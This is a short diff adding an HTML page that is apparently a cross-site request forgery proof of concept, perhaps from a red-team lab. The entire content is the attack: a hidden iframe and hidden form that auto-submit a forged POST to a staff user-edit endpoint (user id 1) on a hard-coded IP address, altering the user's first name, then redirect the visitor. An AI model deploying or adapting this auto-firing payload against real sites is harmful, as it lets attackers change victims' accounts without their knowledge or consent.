@@ -1,0 +1,8 @@
+<iframe style="display:none" name="csrf-frame"></iframe>
+<form method='POST' action='https://35.193.217.186/red/public/staff/users/edit.php?id=1' target="csrf-frame" id="csrf-form">
+  <input type='hidden' name='first_name' value='Russell'>
+  <input type='hidden' value='submit'>
+</form>
+<script>document.getElementById("csrf-form").submit();</script>
+<script>setTimeout(function(){window.location.href = "https://35.193.217.186/red/public/staff"}, 2000);</script>
+
